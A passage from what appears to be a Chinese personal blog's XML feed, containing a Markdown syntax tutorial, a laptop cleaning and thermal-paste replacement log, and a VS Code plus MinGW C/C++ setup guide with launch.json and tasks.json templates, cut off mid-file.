class="line">___粗斜体文本___</span><br></pre></td></tr></table></figure><p>效果如下：<br><em>斜体文本</em><br><em>斜体文本</em></p><p><strong>粗体文本</strong><br><strong>粗体文本</strong></p><p><em><strong>粗斜体文本</strong></em><br><em><strong>粗斜体文本</strong></em></p><p>有的时候有点抽风效果可以看图：</p><img src="/2022/03/27/Markdown/001.png" class=""><hr><h2 id="3-段落"><a href="#3-段落" class="headerlink" title="3.段落"></a>3.段落</h2><p>段落没啥特殊的，一段话写完回车就行，想看着空一点就空一行再写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是一个段落</span><br><span class="line">这也是一个段落</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个段落</span><br><span class="line"></span><br><span class="line">这也是一个段落</span><br></pre></td></tr></table></figure><p>效果1：<br>这是一个段落<br>这也是一个段落</p><p>效果2：<br>这是一个段落</p><p>这也是一个段落</p><hr><h2 id="4-分割线"><a href="#4-分割线" class="headerlink" title="4.分割线"></a>4.分割线</h2><p>本文的分割线是因为主题关系所以显示为虚线</p><p><code>*</code>和<code>-</code>的组合，多少好像问题不大，但是三个最基本的需求就够了</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line">---</span><br><span class="line">* * *</span><br><span class="line">- - -</span><br><span class="line">-----------</span><br></pre></td></tr></table></figure><p>效果如下：</p><hr><hr><hr><hr><hr><p>over！</p><hr><h2 id="5-删除线"><a href="#5-删除线" class="headerlink" title="5.删除线"></a>5.删除线</h2><p>删除线跟加粗类似，使用两组<code>~~</code>组合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>效果如下：<br><del>删除线</del></p><hr><h2 id="6-引用"><a href="#6-引用" class="headerlink" title="6.引用"></a>6.引用</h2><p>引用使用<code>&gt;</code>表示，可以嵌套，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;1</span><br><span class="line">&gt;&gt;2</span><br><span class="line">&gt;&gt;&gt;3</span><br><span class="line">&gt;&gt;&gt;&gt;4</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>1</p><blockquote><p>2</p><blockquote><p>3</p><blockquote><p>4</p></blockquote></blockquote></blockquote></blockquote><h2 id="7-脚注"><a href="#7-脚注" class="headerlink" title="7.脚注"></a>7.脚注</h2><p>脚注用的相对少一点，就相当于对一个词拎出来单独描述，注解的说法。</p><p>例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">他说[^秋天]到了。</span><br><span class="line">[^秋天]:四季之一，进入秋季，意味着降雨、湿度等趋于下降或减少，在自然界中万物开始从繁茂成长趋向萧索成熟。</span><br></pre></td></tr></table></figure><p>效果如图：</p><img src="/2022/03/27/Markdown/000.png" class=""><p>不知道是主题修改了什么，在这个主题下没法显示，但是markdown预览是能看到的</p><hr><h2 id="8-列表"><a href="#8-列表" class="headerlink" title="8.列表"></a>8.列表</h2><p>列表分为有序和无序<br>无序可以使用<code>*</code>，<code>+</code>，<code>-</code>三种符号作为标记</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* 1</span><br><span class="line">* 2</span><br><span class="line">* 3</span><br><span class="line"></span><br><span class="line">+ 1</span><br><span class="line">+ 2</span><br><span class="line">+ 3</span><br><span class="line"></span><br><span class="line">- 1</span><br><span class="line">- 2</span><br><span class="line">- 3</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>1</li><li>2</li><li>3</li></ul><ul><li>1</li><li>2</li><li>3</li></ul><ul><li>1</li><li>2</li><li>3</li></ul><p>而有序列表则通过特定的开头+上<code>.</code>并空一格实现</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 1</span><br><span class="line">2. 2</span><br><span class="line">3. 3</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li>1</li><li>2</li><li>3</li></ol><p>嵌套列表自然是有序和无序的结合，或者是有序之间的叠加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. a</span><br><span class="line">    * aa</span><br><span class="line">2. b</span><br><span class="line">    * bb</span><br><span class="line">3. c</span><br><span class="line">    * cc</span><br><span class="line"></span><br><span class="line">1. a</span><br><span class="line">    1. aa</span><br><span class="line">2. b</span><br><span class="line">    2. bb</span><br><span class="line">3. c</span><br><span class="line">    3. cc</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li>a<ul><li>aa</li></ul></li><li>b<ul><li>bb</li></ul></li><li>c<ul><li>cc</li></ul></li></ol><p>!</p><ol><li>a<ol><li>aa</li></ol></li><li>b<ol start="2"><li>bb</li></ol></li><li>c<ol start="3"><li>cc</li></ol></li></ol><blockquote><p>这里可以看到有序之间的嵌套会使得里面的产生变化</p></blockquote><hr><h2 id="9-代码"><a href="#9-代码" class="headerlink" title="9.代码"></a>9.代码</h2><p>这个我感觉比较适合突出一个东西，类似加粗的效果，加粗是给文本变得厚重，代码函数或者片段更适合用修改背景色来突出。</p><p>此处使用两个反引号`</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`hh`</span><br></pre></td></tr></table></figure><p>效果如下：<br><code>hh</code></p><h2 id="10-链接"><a href="#10-链接" class="headerlink" title="10.链接"></a>10.链接</h2><p>图片和超链接的用法都差不多:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[这是一个指向百度的超链接](www.baidu.com)</span><br><span class="line">虽然有的地方好像在图片用法的前面加了一个!</span><br><span class="line">![这是一张图片](链接使用绝对路径还是相对路径取决于你自己)</span><br></pre></td></tr></table></figure><p>但是总体来讲区别不大，效果如下：<br><a href="www.baidu.com">这是一个指向百度的超链接</a><br><img src="/./source/../../images/logo.jpg" alt="这是一张图片"></p><hr><h2 id="11-表格"><a href="#11-表格" class="headerlink" title="11.表格"></a>11.表格</h2><p>markdown的表格由<code>|</code>来分隔单元格，由<code>-</code>分隔表头和其他行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|  表头   | 表头  |</span><br><span class="line">|  ----  | ----  |</span><br><span class="line">| 单元格  | 单元格 |</span><br><span class="line">| 单元格  | 单元格 |</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table><p>此外还有表格内文本对齐方式设置：<br>* -: 设置内容和标题栏居右对齐。<br>* :- 设置内容和标题栏居左对齐。<br>* :-: 设置内容和标题栏居中对齐。</p><p>效果如下：</p><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中对齐</th></tr></thead><tbody><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr></tbody></table><blockquote><p>但是相对而言，markdown的表格功能单一，就连合并单元格都没法操作，如果有此类需要，我们可以植入html代码</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>markdown的语法其实可以和html混用，但是根据不同浏览器和他的内核版本上，显示的效果可能存在差异，所以尽量少用</p>]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拆机吧</title>
      <link href="/2022/03/25/notebook/"/>
      <url>/2022/03/25/notebook/</url>
      
        <content type="html"><![CDATA[<h1 id="幻14清灰换硅脂"><a href="#幻14清灰换硅脂" class="headerlink" title="幻14清灰换硅脂"></a>幻14清灰换硅脂</h1><span id="more"></span><hr><h1 id="没啥流程"><a href="#没啥流程" class="headerlink" title="没啥流程"></a>没啥流程</h1><img src="/2022/03/25/notebook/000.jpg" class=""><p>准备个螺丝刀，拧开d面全部螺丝<br><strong>d壳右下角是固定在壳上的，拧到一定程度顶起来就行了，不用强行弄出来</strong></p><img src="/2022/03/25/notebook/001.jpg" class=""><p>放好，丢了麻烦</p><img src="/2022/03/25/notebook/002.jpg" class=""><p>积灰~懂得都懂</p><img src="/2022/03/25/notebook/003.jpg" class=""><p>注意，幻14主板有缺陷，尽量先拔掉电池排线，同时注意金属扣不要生碰到主板。。贴吧见过直接静电毙了的。</p><img src="/2022/03/25/notebook/004.jpg" class=""><p>同时，风扇也有两个电源排线连在主板，找个塑料棒挑开，别太用力，线断了麻烦。这边只举例左边。</p><hr><p>拖到暑假。。。因为滑丝了，滑丝工具在家。厚礼谢特</p><p>不要问，问就是工具还涨价，就用一次sei还多买一套。。。</p><img src="/2022/03/25/notebook/005.jpg" class=""><p>拧开散热模组和主板连接的所有螺丝之后，看到cpu和gpu是有点干巴。<br>额，这次换的是相变片，凑合用吧。<br>amd发热量也不小，加上都夏天了，小钢炮的风扇声太搞了。</p><blockquote><p>原本还想擦掉电容和内存颗粒上的硅脂，但是相变片买的不大不小，大是能盖住cpu和gpu，小就是罩不住其他地方了。。。</p></blockquote><p>给风扇吹吹装回去就凑合了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NoteBook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vscode c/c++ run+debug</title>
      <link href="/2022/03/23/vscode-c-c-configure/"/>
      <url>/2022/03/23/vscode-c-c-configure/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在大型项目开发面前，有clion，visual studio 20xx系列的产品存在，但是相对于基础学习，这些大型开发环境的占用和安装流程可能会稍微麻烦点。</p><span id="more"></span><p>在大学常规学习C语言时，我们常用的软件有：</p><ol><li><p>dev c++</p></li><li><p>visual c++ 6.0</p></li><li><p>code:blocks</p></li><li><p>c-free</p></li></ol><p>等常规软件，他们界面相对简单体积小，能满足基本学习要求。故相对而言，这些软件大部分都没什么更新了所以更固定。</p><blockquote><p>如果对对其他不做要求且需要高版本的gcc，那么你可以下载更高版本，去修改编译器使用的gcc即可。</p></blockquote><p>但是如果你和作者一样也喜欢折腾，也对编辑器的外观有一定的追求，那么本文或许能够帮到你。</p><blockquote><p>注意！配置可能稍显麻烦，不喜欢折腾的千万别勉强</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><blockquote><p>正文须知:很多软件的发布都是基于海外服务器，国内或有转载的，但是本文基于官网操作。懂科学之力的自然会得心应手。</p></blockquote><h2 id="0-本文所使用的环境"><a href="#0-本文所使用的环境" class="headerlink" title="0.本文所使用的环境"></a>0.本文所使用的环境</h2><ol><li>windows 11</li><li>vscode 1.65.2</li><li>gcc 9.2</li></ol><h2 id="1-vsocde"><a href="#1-vsocde" class="headerlink" title="1.vsocde"></a>1.vsocde</h2><p>首先我们需要进入官网下载一个vsocode，<a href="https://code.visualstudio.com/">戳此处</a>，这里稍微注意下微软在国内的下载速度有点慢，有能力的朋友可以使用科学之力。</p><img src="/2022/03/23/vscode-c-c-configure/000.png" class=""><p>下载完之后打开vscode，默认是英文环境，按图操作：</p><img src="/2022/03/23/vscode-c-c-configure/001.png" class="">点击安装，完成后右下角会提示重启软件以应用设置。<h2 id="2-mingw"><a href="#2-mingw" class="headerlink" title="2.mingw"></a>2.mingw</h2><h3 id="2-1-gcc安装"><a href="#2-1-gcc安装" class="headerlink" title="2.1 gcc安装"></a>2.1 gcc安装</h3><p>然后我们需要下载gcc，因为code本身只作为一个编辑器，编译以及debug的功能还是需要依赖gcc。<a href="https://sourceforge.net/projects/mingw/">戳此处跳转mingw</a>，还是老话这玩意下的比较慢。</p><img src="/2022/03/23/vscode-c-c-configure/003.png" class=""><p>下载完成后打开.exe程序</p><img src="/2022/03/23/vscode-c-c-configure/004.png" class=""><p>点击install，会进入到</p><img src="/2022/03/23/vscode-c-c-configure/005.png" class=""><p>在此处你可以修改下载的路径，全部下载大概需要五百多兆的内存，老电脑如果c盘不够大建议放置其他盘，新电脑则问题不大，看到<img src="/2022/03/23/vscode-c-c-configure/006.png" class="">后等待下载完点击continue</p><img src="/2022/03/23/vscode-c-c-configure/007.png" class="">,然后轮到我们选择需要安装的组件了:<img src="/2022/03/23/vscode-c-c-configure/008.png" class="">,之前百度的其实也不明不白的，所以直接快刀斩乱麻，全都下载，每行右击选择mark for installation之后点击左上角<img src="/2022/03/23/vscode-c-c-configure/009.png" class=""><p>静候安装，完成后找到你所安装的文件夹目录，进入bin目录，往下滑能看到gcc、g++、gdb则表示基本无误</p><img src="/2022/03/23/vscode-c-c-configure/010.png" class=""><h3 id="2-2-添加到path"><a href="#2-2-添加到path" class="headerlink" title="2.2 添加到path"></a>2.2 添加到path</h3><blockquote><p>右击此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/011.png" class=""><blockquote><p>然后找到系统变量里的path打开</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/012.png" class=""><blockquote><p>点击新建，将你mingw安装目录copy进来，记住要带上bin，如图所示</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/013.png" class=""><p>完成后我们打开cmd或powershell进行验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br><span class="line">g++ -v</span><br></pre></td></tr></table></figure><img src="/2022/03/23/vscode-c-c-configure/014.png" class=""><p>得到如图提示即可</p><blockquote><p>可以的话先重启下电脑，以免vsocde抽风没识别到gcc已经添加到系统环境变量中了。</p></blockquote><p><strong>当然尝鲜的话你可以使用dev c++的gcc使用，只存在版本的差异而已。路径应该是你所安装的盘符&#x2F;dev c++&#x2F;bin目录下。但同时也要注意是否添加入变量环境中！</strong></p><h3 id="2-3-hello-world"><a href="#2-3-hello-world" class="headerlink" title="2.3 hello world"></a>2.3 hello world</h3><p>同样的我们在拓展商店中先下载一个基础从c&#x2F;c++拓展</p><img src="/2022/03/23/vscode-c-c-configure/002.png" class=""><p>建议先创建一个文件夹用来专门存放.c文件</p><img src="/2022/03/23/vscode-c-c-configure/015.png" class=""><p>我们新建一个hello.c文件<img src="/2022/03/23/vscode-c-c-configure/016.png" class=""></p><p>编写第一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f5或者点击运行-&gt;启动调试会弹出一个选择配置</p><img src="/2022/03/23/vscode-c-c-configure/017.png" class=""><p>这里我们直接选择第一个gdb即可，以前用过第二个，但是配置不够完整…..导致程序只能编译运行不能debug，所以也很苦恼，最后将两者结合了一下就差不多行了。</p><img src="/2022/03/23/vscode-c-c-configure/018.png" class=""><p>我们选择gcc.exe之后，我们会发现文件夹下多了一个.vscode，里面有两个文件分别是launch.json和tasks.json。并且都是存在内容的，但是你会发现程序并没有运行，所以直接套用我这里的模板。</p><blockquote><p>需要注意几点就是我的mingw路径是在d盘的，我会在launch.json和tasks.json中指出，希望你能仔细阅读</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//launch.json</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gcc.exe - 生成和调试活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\Windows\\system32\\cmd.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/C&quot;</span><span class="punctuation">,</span><span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span><span class="string">&quot;&amp;&quot;</span><span class="punctuation">,</span><span class="string">&quot;pause&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span><span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span>    <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//tasks.json</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gcc.exe&quot;</span><span class="punctuation">,</span>   <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin&quot;</span> <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span 